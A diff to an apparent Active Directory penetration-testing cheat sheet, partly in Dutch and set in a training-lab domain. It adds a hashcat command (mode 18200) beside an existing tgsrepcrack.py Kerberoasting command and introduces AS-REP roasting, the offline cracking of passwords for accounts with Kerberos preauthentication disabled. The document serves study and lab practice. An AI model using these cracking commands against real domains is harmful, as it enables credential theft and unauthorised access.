@@ -822,6 +822,10 @@ Crack the password for the serviceaccount
 python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
 ```
 
+```
+.\hashcat.exe -m 18200 -a 0 <HASH FILE> <WORDLIST>
+```
+
 ## AS-REPS Roasting
 AS-REPS roasting is een technique waarbij het wachtwoord achterhaald kan worden omdat de 'Do not require Kerberos preauthentication property' is aangezet, oftewel kerberos preauthentication staat uit. Een aanvaller kan de eerste stap van authenticatie overslaan en voor deze gebruiker een TGT aanvragen, welke vervolgens offline gekraakt kan worden.
 #### Enumerating accounts with kerberos preauth disabled
